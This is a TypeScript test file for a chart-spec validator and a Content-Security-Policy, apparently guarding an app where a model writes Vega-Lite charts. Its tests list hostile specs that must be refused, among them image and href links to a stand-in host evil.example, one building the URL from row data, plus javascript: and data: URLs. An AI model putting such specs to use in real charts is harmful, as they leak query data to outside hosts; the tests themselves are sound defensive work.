// A chart spec may not reach the network, and the server's Content-Security-Policy holds if a spec gets past that anyway.
import { describe, expect, it } from 'vitest';
import { checkChartSpec } from '../server/chart.js';
import type { Connection } from '../server/clickhouse.js';
import { unavailableLlm } from '../server/llm.js';
import { contentSecurityPolicy, startServer } from '../server/server.js';

const columns = [{ name: 'country', type: 'String' }, { name: 'revenue', type: 'Float64' }, { name: 'url', type: 'String' }];
const encoding = { x: { field: 'country', type: 'nominal' }, y: { field: 'revenue', type: 'quantitative' } };
const bar = { mark: 'bar', encoding };
const evil = 'https://evil.example/p.png';

describe('checkChartSpec refuses what can reach the network', () => {
  it.each<[string, unknown]>([
    ['an image mark with a url channel', { mark: 'image', encoding: { ...encoding, url: { value: evil } } }],
    ['an image url built from a row', { transform: [{ calculate: `'${evil}?s=' + datum.country`, as: 'u' }], mark: 'image', encoding: { ...encoding, url: { field: 'u' } } }],
    ['an image mark as an object', { mark: { type: 'image', width: 10 }, encoding }],
    ['an image mark with no url at all', { mark: 'image', encoding }],
    ['an image in a layer', { layer: [{ mark: 'image', encoding }] }],
    ['an image in a nested spec', { concat: [{ layer: [{ mark: 'image', encoding }] }] }],
    ['a url mark property', { mark: { type: 'bar', url: evil }, encoding }],
    ['an href channel', { ...bar, encoding: { ...encoding, href: { value: evil } } }],
    ['an href built from a column', { ...bar, encoding: { ...encoding, href: { field: 'url' } } }],
    ['an href mark property', { mark: { type: 'bar', href: evil }, encoding }],
    ['an href in config', { ...bar, config: { mark: { href: evil } } }],
    ['an upper-case key', { ...bar, encoding: { ...encoding, HREF: { value: evil } } }],
    ['a namespaced href', { ...bar, encoding: { ...encoding, 'xlink:href': { value: evil } } }],
    ['usermeta', { ...bar, usermeta: { embedOptions: { loader: { baseURL: evil } } } }],
    ['embedOptions on its own', { ...bar, embedOptions: {} }],
    ['an external paint', { mark: { type: 'bar', fill: 'url(https://evil.example/a.svg#p)' }, encoding }],
    // The rule: only what can make a request. A blob, data or protocol-relative address stays refused wherever it would be fetched.
    ['a css cursor', { mark: { type: 'bar', cursor: 'URL(x.cur), auto' }, encoding }],
    ['an address in an expression', { ...bar, transform: [{ calculate: "'url(//evil.example/' + datum.country + ')'", as: 'u' }] }],
    ['a protocol-relative value', { mark: { type: 'bar', fill: 'url(//evil.example/a#p)' }, encoding }],
    ['a protocol-relative image', { mark: 'image', encoding: { ...encoding, url: { value: '//evil.example/a.png' } } }],
    ['a protocol-relative url key', { mark: { type: 'bar', url: '//evil.example/a' }, encoding }],
    ['javascript:', { ...bar, title: 'javascript:alert(1)' }],
    ['a data: url', { mark: { type: 'bar', fill: 'url(data:image/svg+xml,x#p)' }, encoding }],
    ['a data: image', { mark: 'image', encoding: { ...encoding, url: { value: 'data:image/png;base64,AAAA' } } }],
    ['a data: url key', { mark: { type: 'bar', url: 'data:image/png;base64,AAAA' }, encoding }],
    ['a blob: url', { mark: { type: 'bar', fill: 'url(blob:http://x/y#p)' }, encoding }],
    ['a blob: image', { mark: 'image', encoding: { ...encoding, url: { value: 'blob:http://x/y' } } }],
    ['a blob: url key', { mark: { type: 'bar', url: 'blob:http://x/y' }, encoding }],
    ['raw Vega by $schema', { ...bar, $schema: 'https://vega.github.io/schema/vega/v5.json' }],
    ['a look-alike $schema', { ...bar, $schema: 'https://evil.example/schema/vega-lite/v5.json' }],
    ['a JSON string with an image', JSON.stringify({ mark: 'image', encoding })],
  ])('%s', (_name, spec) => {
    expect(checkChartSpec(spec, columns)).toMatchObject({ ok: false, message: expect.stringMatching(/may not load or link|only a Vega-Lite/) });
  });

  it('says what to fix, so the model can retry', () => {
    const result = checkChartSpec({ mark: 'bar', encoding: { ...encoding, href: { value: evil } } }, columns);
    expect(result).toMatchObject({ ok: false, message: expect.stringContaining('spec.encoding.href') });
  });
});

describe('address text where nothing fetches it passes (real Chromium sent no request for these)', () => {
  it.each<[string, unknown]>([
    ['a data: title', { ...bar, title: 'data:image/png;base64,AAAA' }],
    ['a blob: title', { ...bar, title: 'blob:http://x/y' }],
    ['a protocol-relative expression', { ...bar, transform: [{ calculate: "'//example.org/' + datum.country", as: 'u' }] }],
    ['a data: fill without url(', { mark: { type: 'bar', fill: 'data:image/svg+xml,x' }, encoding }],
    ['a blob: stroke without url(', { mark: { type: 'bar', stroke: 'blob:http://x/y' }, encoding }],
    ['a protocol-relative fill without url(', { mark: { type: 'bar', fill: '//example.org/a' }, encoding }],
  ])('%s', (_name, spec) => {
    expect(checkChartSpec(spec, columns)).toMatchObject({ ok: true });
  });
});

describe('checkChartSpec still takes ordinary charts', () => {
  it.each<[string, unknown]>([
    ['a plain bar', bar],
    ['the Vega-Lite $schema', { ...bar, $schema: 'https://vega.github.io/schema/vega-lite/v6.json' }],
    ['a result column named url', { mark: 'bar', encoding: { x: { field: 'url', type: 'nominal' }, y: { field: 'revenue', type: 'quantitative' } } }],
    ['a transform creating a name url', { ...bar, transform: [{ calculate: 'datum.revenue * 2', as: 'url' }] }],
    ['a column read by name in an expression', { ...bar, transform: [{ calculate: "length(datum.url)", as: 'n' }] }],
    ['data() in an expression, which only reads a dataset in the page', { ...bar, transform: [{ calculate: "length(data('table'))", as: 'n' }] }],
    ['words that look a bit like addresses', { ...bar, title: 'Revenue data: 2024 / profile: https-free, blob of text, curl (x)' }],
    ['a mark config for images, with nothing to load', { ...bar, config: { image: { width: 10 } } }],
    ['a color and a tooltip', { mark: { type: 'bar', tooltip: true, color: '#574d7e' }, encoding }],
  ])('%s', (_name, spec) => {
    expect(checkChartSpec(spec, columns)).toMatchObject({ ok: true });
  });
});

describe('Content-Security-Policy', () => {
  const directive = (policy: string, name: string) => policy.split('; ').find(d => d.startsWith(`${name} `));

  it('keeps images, requests and scripts on this server, without unsafe-eval', () => {
    const policy = contentSecurityPolicy();
    expect(directive(policy, 'default-src')).toBe("default-src 'self'");
    expect(directive(policy, 'script-src')).toBe("script-src 'self'");
    expect(directive(policy, 'img-src')).toBe("img-src 'self' data: blob:");
    expect(directive(policy, 'connect-src')).toBe("connect-src 'self'");
    expect(policy).not.toContain('unsafe-eval');
  });

  it('only the dev server allows its own websocket', () => {
    expect(directive(contentSecurityPolicy(5480), 'connect-src')).toBe("connect-src 'self' ws://127.0.0.1:5480");
  });

  it('is sent on pages and API responses alike', async () => {
    const server = await startServer({ conn: {} as Connection, llm: unavailableLlm('off'), port: 0, ui: 'none', packageRoot: '.' });
    try {
      for (const path of ['/', '/trpc/chat.list?input=%7B%22json%22%3Anull%7D']) {
        expect((await fetch(`${server.url}${path}`)).headers.get('content-security-policy')).toBe(contentSecurityPolicy());
      }
    } finally { await server.close(); }
  });
});
